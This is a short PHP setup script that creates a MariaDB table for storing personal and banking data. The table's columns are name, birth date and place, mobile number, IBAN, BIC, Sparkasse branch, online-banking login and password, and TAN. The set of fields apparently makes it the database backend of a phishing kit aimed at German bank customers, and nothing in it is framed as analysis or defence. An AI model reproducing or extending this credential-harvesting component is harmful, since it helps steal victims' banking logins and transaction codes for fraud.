<?php
error_reporting(E_ALL);

require_once 'db.php';

$sql = '-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: database
-- Erstellungszeit: 19. Mai 2023 um 13:34
-- Server-Version: 10.11.2-MariaDB-1:10.11.2+maria~ubu2204
-- PHP-Version: 8.1.17

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Datenbank: `db01`
--
CREATE DATABASE IF NOT EXISTS `db01` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
USE `db01`;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `user_data`
--

CREATE TABLE IF NOT EXISTS `user_data` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `session_id` varchar(255) NOT NULL,
  `gender` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `first_name` varchar(255) NOT NULL,
  `birth` date NOT NULL,
  `city_of_birth` varchar(255) NOT NULL,
  `mobil_number` varchar(255) NOT NULL,
  `iban` varchar(255) DEFAULT NULL,
  `bic` varchar(255) DEFAULT NULL,
  `olb_land` varchar(255) DEFAULT NULL,
  `olb_sparkasse` varchar(255) DEFAULT NULL,  
  `olb_login` varchar(255) DEFAULT NULL,
  `olb_pw` varchar(255) DEFAULT NULL,
  `tan` varchar(255) DEFAULT NULL,
  `timestamp` int(11) DEFAULT UNIX_TIMESTAMP(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;';

$pdo->exec($sql);


